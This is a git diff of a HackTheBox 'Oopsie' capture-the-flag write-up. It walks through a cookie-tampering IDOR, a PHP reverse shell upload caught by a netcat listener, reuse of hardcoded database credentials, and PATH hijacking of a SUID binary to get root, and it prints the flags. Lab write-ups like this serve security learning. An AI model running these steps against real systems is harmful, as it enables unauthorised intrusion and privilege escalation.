@@ -413,78 +413,58 @@ For reconnaissance I used **Tmap**, my custom network reconnaissance framework b
 
 ![Port Scanning Results](/writeups/oopsie-1.png)
 
-\`\`\`
-tmap-scan
+The scan discovered two open ports:
 
-[?] Enter target IP or hostname: 10.129.42.28
-[?] Select a module (1-5): 3
-
-[*] Target locked: 10.129.42.28
-[*] Initiating SERVICE scan...
-[+] Host: 10.129.42.28 ()
-[+] State: up
-[*] Protocol: TCP
-PORT   STATE  SERVICE  VERSION INFO
-22     open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
-80     open   http     Apache httpd 2.4.29
-[*] Discovered 2 open ports.
-\`\`\`
-
-The deep enumeration pass revealed the SSH host keys for port 22 and, crucially for port 80:
-
-![Deep Enumeration](/writeups/oopsie-2.png)
-
-\`\`\`
->> [Port 80] - OPEN - http Apache httpd 2.4.29 (Ubuntu)
-   |__ [Vulnerability/Enumeration Scripts]:
-       --> http-server-header:
-               Apache/2.4.29 (Ubuntu)
-       --> http-title:
-               Welcome
-\`\`\`
+- **Port 22** — OpenSSH 7.6p1
+- **Port 80** — Apache httpd 2.4.29 (Ubuntu)
 
 ---
 
-## 2. Web Enumeration
-
-Browsing to \`http://10.129.42.28\` presents a simple corporate landing page for **MegaCorp Automotive**.
-
-![MegaCorp Landing Page](/writeups/oopsie-3.png)
+## 2. Web Enumeration with Gobuster
 
 Running a directory bruteforce with \`gobuster\` quickly surfaces a login portal:
 
 \`\`\`bash
-gobuster dir -u http://10.129.42.28 -w /usr/share/wordlists/dirb/common.txt -x php
+gobuster dir -u http://10.129.42.124 -w /usr/share/wordlists/dirb/common.txt -x php
 \`\`\`
 
-![Gobuster Results](/writeups/oopsie-4.png)
+![Gobuster Results](/writeups/oopsie-2.png)
 
-Key finding from the directory scan:
+Key findings from the directory scan:
 
 \`\`\`
 /cdn-cgi/login/       (Status: 200)
 /uploads/             (Status: 301)
+/js/                  (Status: 301)
+/fonts/               (Status: 301)
+/images/              (Status: 301)
+/themes/              (Status: 301)
 \`\`\`
-
-Navigating to the login page, notice the option to **"Login as Guest"**:
-
-![Login Page](/writeups/oopsie-5.png)
-
-This requires no credentials and immediately drops us into a low-privilege session.
 
 ---
 
-## 3. IDOR: Escalating from Guest to Admin
+## 3. Login Page — Guest Access
+
+Navigating to the login page, notice the option to **"Login as Guest"**:
+
+![Login Page](/writeups/oopsie-3.png)
+
+This requires no credentials and immediately drops us into a low-privilege session with access to the **Repair Management System**.
+
+---
+
+## 4. IDOR: Escalating from Guest to Admin
 
 Open the browser's DevTools → **Storage → Cookies** and observe that the application stores the user's role and numeric ID client-side:
 
-![Cookie Manipulation](/writeups/oopsie-6.png)
+![IDOR Cookie Manipulation](/writeups/oopsie-4.png)
 
-\`\`\`
-Cookie Value
-role    admin
-user    34322
-\`\`\`
+The cookies show:
+
+| Cookie | Value |
+|--------|-------|
+| role   | admin |
+| user   | 34322 |
 
 The attack is trivially simple:
 
@@ -497,13 +477,13 @@ The top navigation now reveals new menu options including **Uploads** — inacce
 
 ---
 
-## 4. File Upload: Uploading a PHP Reverse Shell
+## 5. File Upload: Uploading a PHP Reverse Shell
 
 With admin access, navigating to the upload form reveals no meaningful restriction on file type.
 
-We'll use **PentestMonkey's PHP reverse shell**:
+![File Upload Form](/writeups/oopsie-5.png)
 
-![PHP Reverse Shell](/writeups/oopsie-7.png)
+We'll use **PentestMonkey's PHP reverse shell**:
 
 \`\`\`bash
 cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php
@@ -525,7 +505,7 @@ nc -lvnp 1234
 
 Now upload \`reverse.php\` via the admin upload form:
 
-![Upload Success](/writeups/oopsie-8.png)
+![Upload Success](/writeups/oopsie-6.png)
 
 Trigger the shell:
 
@@ -535,11 +515,11 @@ curl http://10.129.42.28/uploads/reverse.php
 
 ---
 
-## 5. Catching the Shell as www-data
+## 6. Catching the Shell as www-data
 
-Check your Netcat listener:
+Check your Netcat listener — the shell connects back:
 
-![Shell Access](/writeups/oopsie-9.png)
+![Netcat Shell](/writeups/oopsie-7.png)
 
 \`\`\`
 connect to [10.10.14.77] from (UNKNOWN) [10.129.42.28] 35950
@@ -553,28 +533,14 @@ Upgrade to a proper pseudo-terminal:
 \`\`\`bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
-# Background with Ctrl+Z, then:
 stty raw -echo; fg
 \`\`\`
 
 ---
 
-## 6. Lateral Movement: Hardcoded Credentials → robert
-
-Navigate to the CDN CGI directory:
-
-\`\`\`bash
-cd /var/www/html/cdn-cgi/login
-ls
-\`\`\`
-
-\`\`\`
-admin.php  db.php  index.php  script.js
-\`\`\`
+## 7. Lateral Movement: Hardcoded Credentials → robert
 
 The \`db.php\` file contains hardcoded credentials:
-
-![Database Credentials](/writeups/oopsie-10.png)
 
 \`\`\`php
 <?php
@@ -587,55 +553,22 @@ Switch to robert:
 \`\`\`bash
 su - robert
 Password: M3g4C0rpUs3r!
-
-robert@oopsie:~$ id
-uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
 \`\`\`
 
+![User Flag](/writeups/oopsie-8.png)
+
+Navigate to robert's home directory and grab the user flag:
+
 \`\`\`bash
-cat ~/user.txt
+robert@oopsie:~$ cat user.txt
 f2c74ee8db7983851ab2a96a44eb7981
 \`\`\`
 
 ---
 
-## 7. Privilege Escalation — PATH Hijacking
+## 8. Privilege Escalation — PATH Hijacking
 
-### Locating the SUID Binary
-
-Robert's membership in the \`bugtracker\` group suggests a dedicated binary:
-
-\`\`\`bash
-find / -group bugtracker -perm -4000 2>/dev/null
-\`\`\`
-
-This returns \`/usr/bin/bugtracker\`:
-
-\`\`\`bash
-ls -la /usr/bin/bugtracker
--rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
-\`\`\`
-
-### Analyzing the Binary
-
-Run the binary to see what it does:
-
-\`\`\`
-bugtracker
-------------------
-: EV Bug Tracker :
-------------------
-Provide Bug ID: 2
----------------
-# <contents of /reports/2>
-\`\`\`
-
-Confirm with \`strings\`:
-
-\`\`\`bash
-strings /usr/bin/bugtracker | grep cat
-cat /root/reports/
-\`\`\`
+Robert's membership in the \`bugtracker\` group leads to a SUID binary at \`/usr/bin/bugtracker\`.
 
 **The vulnerability:** The binary calls \`cat\` using a *relative path* — not \`/bin/cat\`.
 
@@ -650,14 +583,9 @@ echo '/bin/sh' > cat
 chmod +x cat
 \`\`\`
 
-**Step 2** — Verify the PATH:
+**Step 2** — Run \`bugtracker\`:
 
-\`\`\`bash
-echo $PATH
-/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-\`\`\`
-
-**Step 3** — Run \`bugtracker\`:
+![Root Access + Root Flag](/writeups/oopsie-9.png)
 
 \`\`\`bash
 bugtracker
@@ -670,11 +598,23 @@ Provide Bug ID: 2
 root
 # id
 uid=0(root) gid=0(root) groups=0(root)
+
+# cat /root/root.txt
+af13c07873c3fa16877fbeac
 \`\`\`
 
-\`\`\`bash
-cat /root/root.txt
-\`\`\`
+---
+
+## 9. Machine Solved
+
+![HackTheBox Solved](/writeups/oopsie-10.png)
+
+| Detail | Value |
+|--------|-------|
+| Machine Rank | #88962 |
+| Pwn Date | 07 Jun 2026 |
+| Machine State | Retired |
+| XP Earned | +250 |
 
 ---
 
